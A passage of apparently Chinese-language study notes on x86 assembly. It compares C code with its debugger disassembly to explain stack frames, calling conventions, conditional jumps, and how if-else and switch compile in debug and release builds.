retn</span><br></pre></td></tr></table></figure>\n<p>如果我们此时将代码改为如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int add(int a, int b)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn a+b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int aaa=1;</span><br><span class=\"line\"></span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tMessageBox(0,NULL,NULL,MB_OK);</span><br><span class=\"line\">\taaa = add(aaa,4);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00EB13F0 &gt;  55              push    ebp</span><br><span class=\"line\">00EB13F1    8BEC            mov     ebp,esp</span><br><span class=\"line\">00EB13F3    81EC C0000000   sub     esp,0xC0</span><br><span class=\"line\">00EB13F9    53              push    ebx</span><br><span class=\"line\">00EB13FA    56              push    esi</span><br><span class=\"line\">00EB13FB    57              push    edi</span><br><span class=\"line\">00EB13FC    8DBD 40FFFFFF   lea     edi,dword ptr ss:[ebp-0xC0]</span><br><span class=\"line\">00EB1402    B9 30000000     mov     ecx,0x30</span><br><span class=\"line\">00EB1407    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00EB140C    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00EB140E    8BF4            mov     esi,esp</span><br><span class=\"line\">00EB1410    6A 00           push    0x0</span><br><span class=\"line\">00EB1412    6A 00           push    0x0</span><br><span class=\"line\">00EB1414    6A 00           push    0x0</span><br><span class=\"line\">00EB1416    6A 00           push    0x0</span><br><span class=\"line\">00EB1418    FF15 3883EB00   call    dword ptr ds:[&lt;&amp;USER32.MessageBoxW&gt;]    ; user32.MessageBoxW</span><br><span class=\"line\">00EB141E    3BF4            cmp     esi,esp</span><br><span class=\"line\">00EB1420    E8 25FDFFFF     call    00EB114A</span><br><span class=\"line\">00EB1425    6A 04           push    0x4</span><br><span class=\"line\">00EB1427    A1 0070EB00     mov     eax,dword ptr ds:[aaa]</span><br><span class=\"line\">00EB142C    50              push    eax</span><br><span class=\"line\">00EB142D    E8 69FCFFFF     call    00EB109B</span><br><span class=\"line\">00EB1432    83C4 08         add     esp,0x8</span><br><span class=\"line\">00EB1435    A3 0070EB00     mov     dword ptr ds:[aaa],eax</span><br><span class=\"line\">00EB143A    33C0            xor     eax,eax</span><br><span class=\"line\">00EB143C    5F              pop     edi</span><br><span class=\"line\">00EB143D    5E              pop     esi</span><br><span class=\"line\">00EB143E    5B              pop     ebx</span><br><span class=\"line\">00EB143F    81C4 C0000000   add     esp,0xC0</span><br><span class=\"line\">00EB1445    3BEC            cmp     ebp,esp</span><br><span class=\"line\">00EB1447    E8 FEFCFFFF     call    00EB114A</span><br><span class=\"line\">00EB144C    8BE5            mov     esp,ebp</span><br><span class=\"line\">00EB144E    5D              pop     ebp</span><br><span class=\"line\">00EB144F    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00EB13B0 &gt;  55              push    ebp</span><br><span class=\"line\">00EB13B1    8BEC            mov     ebp,esp</span><br><span class=\"line\">00EB13B3    81EC C0000000   sub     esp,0xC0</span><br><span class=\"line\">00EB13B9    53              push    ebx</span><br><span class=\"line\">00EB13BA    56              push    esi</span><br><span class=\"line\">00EB13BB    57              push    edi</span><br><span class=\"line\">00EB13BC    8DBD 40FFFFFF   lea     edi,dword ptr ss:[ebp-0xC0]</span><br><span class=\"line\">00EB13C2    B9 30000000     mov     ecx,0x30</span><br><span class=\"line\">00EB13C7    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00EB13CC    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00EB13CE    8B45 08         mov     eax,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">00EB13D1    0345 0C         add     eax,dword ptr ss:[ebp+0xC]</span><br><span class=\"line\">00EB13D4    5F              pop     edi                                     ; 0038FB84</span><br><span class=\"line\">00EB13D5    5E              pop     esi</span><br><span class=\"line\">00EB13D6    5B              pop     ebx</span><br><span class=\"line\">00EB13D7    8BE5            mov     esp,ebp</span><br><span class=\"line\">00EB13D9    5D              pop     ebp</span><br><span class=\"line\">00EB13DA    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"进制与内存单元长度修饰\"><a class=\"markdownIt-Anchor\" href=\"#进制与内存单元长度修饰\">#</a> 进制与内存单元长度修饰</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add [ebx],0x333</span><br><span class=\"line\">然在实际汇编出来： add byte ptr [ebx], 33</span><br><span class=\"line\"></span><br><span class=\"line\">eax是双字</span><br><span class=\"line\">内存单元访问，默认byte</span><br><span class=\"line\">因此会截断</span><br></pre></td></tr></table></figure>\n<h3 id=\"补充\"><a class=\"markdownIt-Anchor\" href=\"#补充\">#</a> 补充</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int a = 0x109     //a = local.1</span><br><span class=\"line\">int b = 8         //b = local.2</span><br><span class=\"line\"></span><br><span class=\"line\">sub 会影响zf</span><br><span class=\"line\"></span><br><span class=\"line\">je/jz 如果zf=1跳转</span><br><span class=\"line\">jne/jnz</span><br><span class=\"line\"></span><br><span class=\"line\">__asm &#123;</span><br><span class=\"line\">\tmob eax,3</span><br><span class=\"line\">\tsub eax,a</span><br><span class=\"line\">\tjz end</span><br><span class=\"line\">end:</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">无符号JL/JNGE  小于/不大于等于跳转 根据sf，of跳转</span><br><span class=\"line\">有符号JNG/JLE  不大于/小于等于  sf=1||zf=1|||OF=1      ZF=1 || sf!=of</span><br><span class=\"line\">有符号JG/JNLE  大于/不小于等于   ZF=0 &amp;&amp; SF=OF</span><br><span class=\"line\">无符号JA/JG  无符号大于</span><br><span class=\"line\">无符号JBE/JNA 小于等于/大于</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221115213554357.png\" alt=\"image-20221115213554357\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221115213632575.png\" alt=\"image-20221115213632575\"></p>\n<blockquote>\n<p>EBP 栈底指针 base pointer</p>\n<p>ESP 栈顶指针</p>\n<p>EBP  -/+ 偏移量可以访问 call 里的局部变量</p>\n<p>ESP 栈顶指针与 EBP 构成了一段空间，一般就是本 call 局部变量的空间大小总和</p>\n<p>空函数中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push ebp   //保存上一个函数的栈底，上一个函数的栈顶就是新的ebp，即原来的esp</span><br><span class=\"line\">mov ebp,esp  //确定新的栈底</span><br><span class=\"line\">pop ebp</span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221116195359372.png\" alt=\"image-20221116195359372\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221116200409461.png\" alt=\"image-20221116200409461\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int a = 3</span><br><span class=\"line\">int b = 5</span><br><span class=\"line\">char c = 1</span><br><span class=\"line\"></span><br><span class=\"line\">char s[17]  //如果微软编译器可能会多分配几个字节防止数组越界导致程序崩溃</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sub esp,0C   //0c因为内存对齐</span><br><span class=\"line\">mov dword ptr [local.1],3   //local.1 == ebp-4</span><br><span class=\"line\">mov dword ptr [local.2],5   //local.2 == ebp-4</span><br><span class=\"line\">mov byte ptr [local.3+3],1 //local.3 == ebp+3   //因为只使用了一个字节，从顶往下减少三个</span><br><span class=\"line\">mov esp,ebp</span><br><span class=\"line\">pop ebp</span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n<p>每个 call 分配独立的栈段空间，供局部变量使用</p>\n<p>call 平衡，pop 后 ebp 和 esp 不变</p>\n<p>栈的上面小，下面大</p>\n<p>push ebp      //sub esp,4  mov esp,[ebp]</p>\n<p>pop ebp       //mov ebp,[esp] add esp,4</p>\n<p>参数入栈又右向左入栈</p>\n<p>ecx 放 this 指针，eax 放返回值</p>\n<p>call 执行 push eIP</p>\n<p>retn pop eip</p>\n<p>32 位内存中，EIP (32 位) 已经能表达所有内存地址。而 16 位系统中的内存地址是 20 位，所以需要 IP 和 CS 同时入栈</p>\n<p><strong>参数局部变量的表示   [EBP - x] 本 call 中的局部变量      [EBP+x] 上一个 call 的局部变量作为传入参数</strong></p>\n<p>[ebp +4] 是父函数 EBP 的值，[EBP+8] 大概率是外部传进来的参数值</p>\n<p>调用约定：</p>\n<p>​\t__cdecl 是 c declaration 缩写，所有参数从右到左依次入栈，这些参数由调用者清除，称为手动清栈，即清栈是在 call 后面   call 0010000h   add esp+x   VC 默认约定</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __cdecl add(int a, int b)</span><br></pre></td></tr></table></figure>\n<p>​\t__stdcall api 函数调用约定，是 c++ 标准调用方式，所有参数从右到左依次入栈，如果调用类成员，最后一个入栈的是 this 指针，这些堆栈由被调用者在返回后清除，retx，x 代表参数占用字节数，cpu 在 ret 之后自动弹出 x 个栈空间，称为自动清栈</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __stdcall add2(int a, int b)</span><br></pre></td></tr></table></figure>\n<p>​\t__fastcall 调用约定，是编译器指定的快速调用方式。fastcall 规定将前两个 (若干个参数由寄存器传递，其余参数通过堆栈传递)，返回方式和 stdcall 一样，如果只有两个参数，不用栈，不需要堆栈平衡，如果有很多参数，还需要用堆栈平衡部分堆栈</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __fastcall add3(int a, int b)</span><br></pre></td></tr></table></figure>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221116223933037.png\" alt=\"image-20221116223933037\" style=\"zoom: 67%;\" />\n<p>c 中不加默认说明为_cedcl 方式，c++ 也一样，默认调用方式可以在 ide 中设置</p>\n<p>带有可变参数的函数必须使用_cdecl 方式，比如 printf (char *fmtstr, …) scanf</p>\n</blockquote>\n<h4 id=\"if-else\"><a class=\"markdownIt-Anchor\" href=\"#if-else\">#</a> if-else</h4>\n<blockquote>\n<p><strong>if-else:</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;haha&quot;);</span><br><span class=\"line\">\tint a=1, b=2;</span><br><span class=\"line\">\tif (a&gt;b)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\t&#125; else &#123;</span><br><span class=\"line\">\t\tprintf(&quot;zhizhang&quot;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>debug</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00EF13A0 &gt;  55              push    ebp</span><br><span class=\"line\">00EF13A1    8BEC            mov     ebp,esp</span><br><span class=\"line\">00EF13A3    81EC D8000000   sub     esp,0xD8</span><br><span class=\"line\">00EF13A9    53              push    ebx</span><br><span class=\"line\">00EF13AA    56              push    esi</span><br><span class=\"line\">00EF13AB    57              push    edi</span><br><span class=\"line\">00EF13AC    8DBD 28FFFFFF   lea     edi,dword ptr ss:[ebp-0xD8]</span><br><span class=\"line\">00EF13B2    B9 36000000     mov     ecx,0x36</span><br><span class=\"line\">00EF13B7    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00EF13BC    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">//堆栈操作上面有写，自己看啊</span><br><span class=\"line\"></span><br><span class=\"line\">00EF13BE    8BF4            mov     esi,esp</span><br><span class=\"line\">00EF13C0    68 5057EF00     push    00EF5750                              ; ASCII &quot;haha&quot;</span><br><span class=\"line\">00EF13C5    FF15 BC82EF00   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00EF13CB    83C4 04         add     esp,0x4</span><br><span class=\"line\">//printf调用结束后保护现场，属于手动清栈</span><br><span class=\"line\"></span><br><span class=\"line\">00EF13CE    3BF4            cmp     esi,esp</span><br><span class=\"line\">00EF13D0    E8 70FDFFFF     call    00EF1145</span><br><span class=\"line\">//00EF1145   /E9 16030000     jmp     _RTC_CheckEsp</span><br><span class=\"line\"></span><br><span class=\"line\">00EF13D5    C745 F8 0100000&gt;mov     dword ptr ss:[ebp-0x8],0x1</span><br><span class=\"line\">00EF13DC    C745 EC 0200000&gt;mov     dword ptr ss:[ebp-0x14],0x2</span><br><span class=\"line\">//局部变量a,b入栈</span><br><span class=\"line\"></span><br><span class=\"line\">00EF13E3    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">00EF13E6    3B45 EC         cmp     eax,dword ptr ss:[ebp-0x14]</span><br><span class=\"line\">比较a 和 b的大小</span><br><span class=\"line\">00EF13E9    7E 19           jle     short 00EF1404</span><br><span class=\"line\">00EF13EB    8BF4            mov     esi,esp</span><br><span class=\"line\">00EF13ED    68 4857EF00     push    00EF5748                              ; ASCII &quot;shabi&quot;</span><br><span class=\"line\">00EF13F2    FF15 BC82EF00   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00EF13F8    83C4 04         add     esp,0x4</span><br><span class=\"line\">00EF13FB    3BF4            cmp     esi,esp</span><br><span class=\"line\">00EF13FD    E8 43FDFFFF     call    00EF1145</span><br><span class=\"line\">00EF1402    EB 17           jmp     short 00EF141B</span><br><span class=\"line\">00EF1404    8BF4            mov     esi,esp</span><br><span class=\"line\">00EF1406    68 3C57EF00     push    00EF573C                              ; ASCII &quot;zhizhang&quot;</span><br><span class=\"line\">00EF140B    FF15 BC82EF00   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00EF1411    83C4 04         add     esp,0x4</span><br><span class=\"line\">00EF1414    3BF4            cmp     esi,esp</span><br><span class=\"line\">00EF1416    E8 2AFDFFFF     call    00EF1145</span><br><span class=\"line\">00EF141B    33C0            xor     eax,eax</span><br><span class=\"line\">00EF141D    5F              pop     edi</span><br><span class=\"line\">00EF141E    5E              pop     esi</span><br><span class=\"line\">00EF141F    5B              pop     ebx</span><br><span class=\"line\">00EF1420    81C4 D8000000   add     esp,0xD8</span><br><span class=\"line\">00EF1426    3BEC            cmp     ebp,esp</span><br><span class=\"line\">00EF1428    E8 18FDFFFF     call    00EF1145</span><br><span class=\"line\">00EF142D    8BE5            mov     esp,ebp</span><br><span class=\"line\">00EF142F    5D              pop     ebp</span><br><span class=\"line\">00EF1430    C3              retn</span><br></pre></td></tr></table></figure>\n<p>release</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000E1000 &gt;/$  56            push    esi</span><br><span class=\"line\">000E1001  |.  8B35 A0200E00 mov     esi,dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]    ;  msvcr90.printf</span><br><span class=\"line\">000E1007  |.  68 F4200E00   push    000E20F4                                ; /format = &quot;haha&quot;</span><br><span class=\"line\">000E100C  |.  FFD6          call    esi                                     ; \\printf</span><br><span class=\"line\">000E100E  |.  68 FC200E00   push    000E20FC                                ;  ASCII &quot;zhizhang&quot;</span><br><span class=\"line\">000E1013  |.  FFD6          call    esi</span><br><span class=\"line\">000E1015  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">000E1018  |.  33C0          xor     eax,eax</span><br><span class=\"line\">000E101A  |.  5E            pop     esi</span><br><span class=\"line\">000E101B  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<p>OD 文件夹中有 UDD 作为缓存</p>\n</blockquote>\n<h4 id=\"switch-case\"><a class=\"markdownIt-Anchor\" href=\"#switch-case\">#</a> switch case</h4>\n<blockquote>\n<p><strong>switch-case</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;haha&quot;);</span><br><span class=\"line\">\tint a=1, b=2;</span><br><span class=\"line\">\tswitch(a)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\tcase 1:</span><br><span class=\"line\">\t\tprintf(&quot;1111&quot;);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\tcase 2:</span><br><span class=\"line\">\t\tprintf(&quot;2222&quot;);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\tcase 3:</span><br><span class=\"line\">\t\tprintf(&quot;3333&quot;);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\tdefault:</span><br><span class=\"line\">\t\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00FF13BE    8BF4            mov     esi,esp</span><br><span class=\"line\">00FF13C0    <span class=\"number\">68</span> 5C57FF00     push    00FF575C                                ; ASCII <span class=\"string\">&quot;haha&quot;</span></span><br><span class=\"line\">00FF13C5    FF15 BC82FF00   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]       ; msvcr90d.printf</span><br><span class=\"line\">00FF13CB    83C4 04         add     esp,<span class=\"number\">0x4</span></span><br><span class=\"line\">00FF13CE    3BF4            cmp     esi,esp</span><br><span class=\"line\">00FF13D0    E8 70FDFFFF     call    00FF1145</span><br><span class=\"line\"></span><br><span class=\"line\">00FF13D5    C745 F8 <span class=\"number\">0</span>100000&gt;mov     dword ptr ss:[ebp-<span class=\"number\">0x8</span>],<span class=\"number\">0x1</span></span><br><span class=\"line\">00FF13DC    C745 EC 0200000&gt;mov     dword ptr ss:[ebp-<span class=\"number\">0x14</span>],<span class=\"number\">0x2</span></span><br><span class=\"line\">//局部变量a,b入栈</span><br><span class=\"line\">00FF13E3    8B45 F8         mov     eax,dword ptr ss:[ebp-<span class=\"number\">0x8</span>]</span><br><span class=\"line\">00FF13E6    <span class=\"number\">8985</span> 24FFFFFF   mov     dword ptr ss:[ebp-<span class=\"number\">0xDC</span>],eax</span><br><span class=\"line\">//[ebp-<span class=\"number\">0xdc</span>] = a</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00FF13EC    83BD 24FFFFFF <span class=\"number\">0</span>&gt;cmp     dword ptr ss:[ebp-<span class=\"number\">0xDC</span>],<span class=\"number\">0x1</span></span><br><span class=\"line\">00FF13F3    <span class=\"number\">74</span> <span class=\"number\">14</span>           je      short 00FF1409</span><br><span class=\"line\">00FF13F5    83BD 24FFFFFF <span class=\"number\">0</span>&gt;cmp     dword ptr ss:[ebp-<span class=\"number\">0xDC</span>],<span class=\"number\">0x2</span></span><br><span class=\"line\">00FF13FC    <span class=\"number\">74</span> <span class=\"number\">24</span>           je      short 00FF1422</span><br><span class=\"line\">00FF13FE    83BD 24FFFFFF <span class=\"number\">0</span>&gt;cmp     dword ptr ss:[ebp-<span class=\"number\">0xDC</span>],<span class=\"number\">0x3</span></span><br><span class=\"line\">00FF1405    <span class=\"number\">74</span> <span class=\"number\">34</span>           je      short 00FF143B</span><br><span class=\"line\">//比较a和<span class=\"keyword\">case</span>中值，如果相等那么跳转</span><br><span class=\"line\"></span><br><span class=\"line\">00FF1407    EB 4B           jmp     short 00FF1454</span><br><span class=\"line\">//<span class=\"keyword\">case</span></span><br><span class=\"line\"></span><br><span class=\"line\">00FF1409    8BF4            mov     esi,esp</span><br><span class=\"line\">00FF140B    <span class=\"number\">68</span> 5457FF00     push    00FF5754                                ; ASCII <span class=\"string\">&quot;1111&quot;</span></span><br><span class=\"line\">00FF1410    FF15 BC82FF00   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]       ; msvcr90d.printf</span><br><span class=\"line\">00FF1416    83C4 04         add     esp,<span class=\"number\">0x4</span></span><br><span class=\"line\"></span><br><span class=\"line\">00FF1419    3BF4            cmp     esi,esp</span><br><span 